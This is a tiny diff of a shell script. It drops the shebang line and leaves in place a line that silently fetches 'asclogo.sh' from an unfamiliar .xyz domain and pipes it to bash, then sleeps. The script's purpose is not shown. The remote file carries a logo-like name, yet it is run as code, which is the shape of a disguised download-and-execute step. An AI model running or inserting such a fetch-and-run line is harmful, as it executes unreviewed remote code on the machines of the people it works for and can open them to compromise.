@@ -1,4 +1,3 @@
-#!/bin/bash
 
 curl -s https://data.zamzasalim.xyz/file/uploads/asclogo.sh | bash
 sleep 2
